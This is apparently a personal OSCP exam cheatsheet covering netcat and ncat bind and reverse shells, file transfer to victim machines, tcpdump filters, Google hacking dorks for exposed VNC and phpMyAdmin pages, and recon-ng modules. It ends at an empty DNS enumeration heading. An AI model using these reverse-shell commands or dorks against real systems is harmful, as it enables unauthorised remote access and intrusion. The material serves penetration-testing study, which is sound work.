# OSCP
Cheatsheet for my OSCP labs / exam.

# Index

- [Introduction](#introduction) 

# Content

### ============================================================
### Introduction
### ============================================================


### ============================================================
### Essential Tools
### ============================================================

**Netcat**  
Basics
```bash
nc -nlvp [port]          # set up listener
nc -nv [IP] [port]       # banner grabbing OR connect to remote port
```
File Transfer
```bash
nc -nlvp [port] > incoming.exe          # VIC: set up listener, direct data to incoming.exe
nc -nv [IP] [port] < /path/to/wget.exe  # ATT: push wget.exe file to VIC
```
Bind Shell: bind executable (e.g. cmd.exe) to a local port (typically victim machine)
```bash
nc -nlvp [port] -e cmd.exe  # VIC: set up listener + bind cmd.exe to local port
nc -nv [VIC IP] [port]   # ATT: attacker connects and is presented with cmd prompt
```
Reverse Shell: victim box connect to attacker box
```bash
nc -nvlp [port]                       # ATT: attacker set up listener
nc -nv [ATT IP] [port] -e /bin/bash   # VIC: attacker sends reverse shell to their box
```

**Ncat**  
Ncat is an improved version of the Netcat tool, with SSL encryption + ability to whitelist access to specific IP's.

Secure Bind Shell:
```bash
ncat -lvp 4444 -e cmd.exe --allow [IP] --ssl   # Box A: set up listener, allow on connections from only IP, SSL-encrypted.
ncat -v 10.11.14.143 4444 --ssl                # Box B: connect to Box A, SSL-encrypted.
```

**Tcpdump**

Analyse traffic from file (.pcap etc.) + show data in hex and ASCII
```bash
tcpdump -nX -r filename.pcap
```

Analyse and filter traffic:
```bash
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap   # src filter
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap   # dest filter
tcpdump -n port 81 -r password_cracking_filtered.pcap                 # port filter
```


### ============================================================
### Passive Info Gathering
### ============================================================

**Google Hacking**

More with Google Hacking Database https://www.exploit-db.com/google-hacking-database/

```bash
site:"microsoft.com" -site:"www.microsoft.com"            # list subdomains of Microsoft.com
site:"microsoft.com" filetype:ppt "penetration testing"   # list .ppt files with term "penetration testing"
intitle:"VNC viewer for Java"                             # list pages with a open VNC access pages
inurl:"/control/userimage.html"                           # list pages which contain file "/control/userimage.html"
inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin # list pages with post-authenticated db admin page.
```

**Recon-ng**

Basic usage:
```bash
recon-ng                                # access recon-ng
use recon/path/to/module                # use module
set SOURCE uber.com                     # set source target
run                                     # run module
```

Some useful modules:
```bash
recon/domains-contacts/whois_pocs       # find employee names and email addresses
recon/domains-vulnerabilies/xssed       # find existing XSS vulnerabilities
recon/domains-hosts/google_site_web     # find subdomains via. Google search
```

### ============================================================
### Active Info Gathering
### ============================================================

**DNS Enumeration**


